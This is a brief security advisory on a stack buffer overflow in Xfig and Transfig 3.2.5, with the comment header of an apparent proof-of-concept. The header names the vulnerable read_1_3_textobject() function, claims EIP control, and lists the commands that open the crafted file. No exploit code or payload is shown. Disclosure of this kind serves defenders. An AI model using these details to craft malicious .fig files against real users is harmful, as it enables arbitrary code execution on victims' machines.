Xfig and Transfig are prone to a buffer-overflow vulnerability because they fail to perform adequate boundary checks on user-supplied input.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

Xfig and Transfig 3.2.5 are vulnerable; other versions may also be affected.

C      PROBLEM:
C      A STACK-BASED BUFFER OVERFLOW OCCURS IN read_1_3_textobject()
C      WHEN READING MALFORMED .FIG FILES
C      EIP IS OVERWRITTEN SO IT'S NOT JUST A CRASH
C
C      TEST:
C      xfig plane.fig
C      fig2dev -L png plane.fig
C      (IT DOESN'T HAVE TO BE "PNG")
C
C      SOLUTION:
C      DON'T TAKE .FIG CANDY FROM STRANGERS
C
C      OLDSKOOL FORTRAN POCS FTW
